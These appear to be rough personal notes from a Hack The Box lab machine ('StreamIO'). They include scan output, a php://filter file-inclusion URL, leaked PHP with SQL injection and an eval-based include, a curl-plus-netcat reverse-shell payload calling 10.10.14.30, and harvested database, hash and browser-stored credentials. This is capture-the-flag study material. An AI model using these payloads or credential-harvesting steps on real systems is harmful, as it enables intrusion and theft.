

```
[Apr 09, 2025 - 00:03:23 (+03)] exegol-htb /workspace # nmap -sC -sV -Pn 10.10.11.158
Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-09 00:03 +03
Nmap scan report for 10.10.11.158
Host is up (0.069s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-09 04:03:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb  <------------------------------------
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-title: Not Found
|_ssl-date: 2025-04-09T04:04:41+00:00; +7h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-04-09T04:04:02
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.85 seconds
```





```
admin :665a50ac9eaa781e4f7f04199db97a11
admin: paddpadd
```

we got a bunch of users and password, lets crack all the passwods and see what the existing users are


```
[Apr 10, 2025 - 18:11:06 (+03)] exegol-htb /workspace # kerbrute userenum --domain "streamIO.htb" --dc DC.streamio.htb --safe usersforstream.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: dev (n/a) - 04/10/25 - Ronnie Flathers @ropnop

2025/04/10 18:11:13 >  Using KDC(s):
2025/04/10 18:11:13 >   DC.streamio.htb:88

2025/04/10 18:11:14 >  [+] VALID USERNAME:       yoshihide@streamIO.htb
2025/04/10 18:11:14 >  Done! Tested 30 usernames (1 valid) in 0.234 seconds
```


```
66boysandgirls..
```



```
https://streamio.htb/admin/?user=
```



```
[Apr 10, 2025 - 19:28:30 (+03)] exegol-htb /workspace # ffuf -u https://streamio.htb/admin/\?FUZZ\= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=0b6ehe1hrtmpa4ac1kta8efubq" -fs 1678

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Cookie: PHPSESSID=0b6ehe1hrtmpa4ac1kta8efubq
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1678
________________________________________________

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 70ms]
movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 75ms]
staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 97ms]
user                    [Status: 200, Size: 2073, Words: 146, Lines: 63, Duration: 69ms]
:: Progress: [6453/6453] :: Job [1/1] :: 769 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```


```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```


```php
¢yr<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```


```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php
```



wtf.php to get RCE

```
system("curl 10.10.14.30/nc.exe -o c:\\windows\\temp\\nc.exe");
system("c:\\windows\\temp\\nc.exe 10.10.14.30 4443 -e cmd.exe");
```

we enumerate the files specifically login.php and we find credentials

```
        <h1>Log into your account</h1>
<?php
$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
$handle = sqlsrv_connect('(local)',$connection);
function bad_char_check($name)
{
  $bad_chars = array('!','"','#','$','%','&','\\','\'','(',')','*','+',',','-','.','/',':',';','<','=','>','?','@','[',']','^','`','{','|','}','~');
```

also credentials in register.php

```python
PS C:\inetpub\streamio.htb> dir -recurse *.php | select-string -pattern "database"
dir -recurse *.php | select-string -pattern "database"

admin\index.php:9:$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
login.php:46:$connection = array("Database"=>"STREAMIO" , "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
register.php:81:    $connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```



```python
SQL (db_admin  db_admin@streamio_backup)> select * from users;
id   username                                             password
--   --------------------------------------------------   --------------------------------------------------
 1   nikk37                                               389d14cb8e4e9b94b137deb1caf0612a

 2   yoshihide                                            b779ba15cedfd22a023c4d8bcf5f2332

 3   James                                                c660060492d9edcaa8332d89c99c9239

 4   Theodore                                             925e5408ecb67aea449373d668b7359e

 5   Samantha                                             083ffae904143c4796e464dac33c1f7d

 6   Lauren                                               08344b85b329d7efd611b7a7743e8a09

 7   William                                              d62be0dc82071bccc1322d64ec5b6c51

 8   Sabrina                                              f87d3c0d6c8fd686aacc6627f1f493a5

```


```python
nikk37:get_dem_girls2@yahoo.com
```


now  we can winrm in and we had decrypted the passwords in firefox

```python
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'
```



restart this box

- re read nmap use your fucking eyes 
- learn directory bruteforcing again an d what the best wordlists are
- actually learn SQL injection properly
- php